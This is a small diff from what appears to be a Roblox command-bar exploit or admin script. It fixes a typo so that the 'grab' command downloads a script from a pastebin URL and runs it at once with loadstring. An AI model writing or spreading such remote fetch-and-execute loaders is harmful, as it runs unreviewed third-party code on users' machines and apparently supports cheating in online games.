@@ -3034,7 +3034,7 @@ if string.sub(cmdbar.Text,1,5) == "wcamo" then
 end;
 
 if string.sub(cmdbar.Text,1,4) == "grab" or string.sub(cmdbar.Text,1,5) == prefix.."grab" then 
-	loadsrting(game:HttpGet("https://pastebin.com/raw/SqxfdfpC", true))()
+	loadstring(game:HttpGet("https://pastebin.com/raw/SqxfdfpC", true))()
 end
 
 	if string.sub(cmdbar.Text,1,4) == "otag" or string.sub(cmdbar.Text,1,5) == prefix.."otag" then
